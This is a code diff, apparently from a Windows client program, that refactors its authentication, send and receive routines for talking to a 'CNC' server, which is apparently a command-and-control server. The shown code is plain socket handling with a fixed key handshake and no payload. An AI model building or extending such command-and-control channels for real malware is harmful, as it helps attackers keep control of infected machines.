@@ -50,17 +50,16 @@ void init_cnc_sock()
 
 void auth_with_cnc()
 {
-    int ret;
-    char received_auth_key[AUTH_KEY_LEN + 1];
+    int byte_count;
+    char received_auth_key[AUTH_KEY_LEN];
 
     log_info("Authenticating with CNC.");
-    ret = send_to_cnc(AUTH_KEY_TO_CNC, AUTH_KEY_LEN);
-    if (ret != AUTH_KEY_LEN)
+    byte_count = send_to_cnc(AUTH_KEY_TO_CNC, AUTH_KEY_LEN);
+    if (byte_count != AUTH_KEY_LEN)
         fatal_error("Failed to send authentication key to CNC.");
 
-    ret = recv_from_cnc(received_auth_key, AUTH_KEY_LEN);
-    received_auth_key[AUTH_KEY_LEN] = 0;
-    if (ret != AUTH_KEY_LEN || strcmp(received_auth_key, AUTH_KEY_FROM_CNC))
+    byte_count = recv_from_cnc(received_auth_key, AUTH_KEY_LEN);
+    if (byte_count != AUTH_KEY_LEN || memcmp(received_auth_key, AUTH_KEY_FROM_CNC, AUTH_KEY_LEN))
         fatal_error("Received invalid authentication key from CNC.");
 }
 
@@ -102,40 +101,32 @@ void reconnect_to_cnc()
 
 int send_to_cnc(void *buf, size_t len)
 {
-    int ret;
+    int bytes_sent;
 
-    while (TRUE)
+    bytes_sent = send(cnc_sock, buf, len, 0);
+    if (bytes_sent == SOCKET_ERROR)
+        fatal_error("Error at send(): %ld", WSAGetLastError());
+    if (!bytes_sent)
     {
-        ret = send(cnc_sock, buf, len, 0);
-        if (ret == SOCKET_ERROR)
-            fatal_error("Error at send(): %ld", WSAGetLastError());
-        if (!ret)
-        {
-            log_error("Connection with CNC broke.");
-            reconnect_to_cnc();
-            return 0;
-        }
-        return ret;
+        log_error("Connection with CNC broke.");
+        reconnect_to_cnc();
     }
+    return bytes_sent;
 }
 
 int recv_from_cnc(void *buf, size_t len)
 {
-    int ret;
+    int bytes_read;
 
-    while (TRUE)
+    bytes_read = recv(cnc_sock, buf, len, 0);
+    if (bytes_read == SOCKET_ERROR)
+        fatal_error("Error at recv(): %ld", WSAGetLastError());
+    if (!bytes_read)
     {
-        ret = recv(cnc_sock, buf, len, 0);
-        if (ret == SOCKET_ERROR)
-            fatal_error("Error at recv(): %ld", WSAGetLastError());
-        if (!ret)
-        {
-            log_error("Connection with CNC broke.");
-            reconnect_to_cnc();
-            return 0;
-        }
-        return ret;
+        log_error("Connection with CNC broke.");
+        reconnect_to_cnc();
     }
+    return bytes_read;
 }
 
 void init_cnc_conn(char *host)
